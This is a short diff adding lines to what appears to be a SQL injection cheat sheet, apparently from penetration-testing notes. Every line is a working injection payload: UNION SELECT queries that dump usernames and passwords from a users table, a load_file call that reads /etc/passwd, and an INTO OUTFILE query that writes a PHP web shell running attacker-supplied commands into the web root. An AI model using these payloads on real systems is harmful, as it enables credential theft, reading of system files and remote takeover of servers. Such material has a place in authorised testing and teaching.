@@ -103,3 +103,14 @@ union select 1,2,column_name FROM information_schema.columns where table_name='u
 #  
    union select 1,2,group_concat(concat(name,password)) from uhc.users-- 
 
+
+
+#### Create file and read file using sql 
+
+
+#
+  union select 1,2,load_file('/etc/passwd')--"
+
+
+#  
+ union select 1,2,'<?php system($_REQUEST[cmd]);?>' into outfile '/var/www/html/pentestblog.php'--"
